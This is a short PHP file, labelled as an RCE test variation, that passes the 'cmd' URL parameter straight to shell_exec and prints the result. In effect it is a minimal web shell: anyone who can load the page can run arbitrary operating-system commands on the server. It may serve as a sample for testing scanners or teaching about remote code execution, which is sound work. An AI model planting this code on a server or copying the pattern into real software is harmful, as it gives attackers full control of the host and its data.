<?php
// RCE test variation #1293
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>